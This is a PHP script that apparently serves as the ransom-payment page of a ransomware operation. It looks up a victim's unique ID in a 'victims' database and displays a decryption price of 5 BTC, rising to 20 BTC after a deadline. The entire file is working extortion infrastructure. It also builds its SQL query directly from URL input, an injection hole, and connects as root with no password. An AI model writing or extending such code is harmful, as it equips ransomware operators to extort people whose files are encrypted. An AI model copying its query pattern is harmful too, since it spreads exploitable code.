<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$getTargetID = $_GET['unique_id'];

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $sql = "SELECT time_expired from target_list where unique_id = \"$getTargetID\"";
   $result = $conn->query($sql);
   
   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) {
         $getExpire = $row['time_expired'];
         
         if ($getExpire == 1) {
            echo "<center><h1>Your time expired, the price for your key is now 20 BTC!</h1></center>";
         } else {
            echo "<center><h1>The current price to decrypt your files is currently 5 BTC!</h1></center>";
         }
      }
   } else {
        echo "<br />Could not determine your unique host id!</br>";
   }
}

$conn->close();

?>
